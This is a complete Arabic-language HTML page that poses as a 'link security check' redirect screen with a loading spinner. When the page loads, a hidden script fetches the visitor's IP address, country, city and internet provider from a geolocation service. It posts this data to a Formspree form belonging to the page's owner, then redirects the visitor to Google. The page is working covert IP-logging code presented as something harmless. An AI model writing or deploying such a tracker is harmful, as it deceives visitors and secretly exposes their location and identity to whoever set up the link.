<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري تحويلك...</title>
    <style>
        body { background: #0f172a; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #38bdf8; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .card { text-align: center; padding: 20px; background: #1e293b; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
    </style>
</head>
<body>

    <div class="card">
        <div class="loader"></div>
        <h2>جاري فحص أمان الرابط...</h2>
        <p>يرجى الانتظار قليلاً، سيتم توجيهك تلقائياً.</p>
    </div>

    <script>
        async function captureData() {
            try {
                // 1. جلب بيانات الزائر (IP والموقع)
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();

                // 2. إرسال البيانات إلى Formspree الخاص بك
                await fetch("https://formspree.io/f/mojlagrq", {
                    method: "POST",
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        "الـ IP": data.ip,
                        "الدولة": data.country_name,
                        "المدينة": data.city,
                        "شركة الإنترنت": data.org,
                        "الوقت": new Date().toLocaleString('ar-EG')
                    })
                });
            } catch (error) {
                console.log("Error capturing data");
            } finally {
                // 3. التحويل للرابط النهائي (مثلاً جوجل) بعد ثانية واحدة من الإرسال
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 1000);
            }
        }

        // تشغيل الدالة فور تحميل الصفحة
        window.onload = captureData;
    </script>
</body>
</html>
